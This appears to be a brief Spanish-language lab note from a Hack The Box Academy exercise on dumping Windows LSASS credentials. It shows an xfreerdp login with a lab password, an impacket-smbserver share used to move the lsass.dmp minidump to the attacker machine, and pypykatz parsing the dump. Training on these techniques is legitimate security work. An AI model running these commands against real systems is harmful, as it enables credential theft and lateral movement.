

- conectado por RDP

```
xfreerdp /v:10.129.196.240 /u:htb-student /p:HTB_@cademy_stdnt!
```

![[Pasted image 20240229091227.png]]

- create dump file

![[Pasted image 20240229091353.png]]


- crear servidor smb compartido

`impacket-smbserver -smb2support CompData . `

- traspasar a maquina local el minidump

![[Pasted image 20240229091256.png]]

- leer el minidump

```
pypykatz lsa minidump lsass.dmp
```

![[Pasted image 20240229091922.png]]
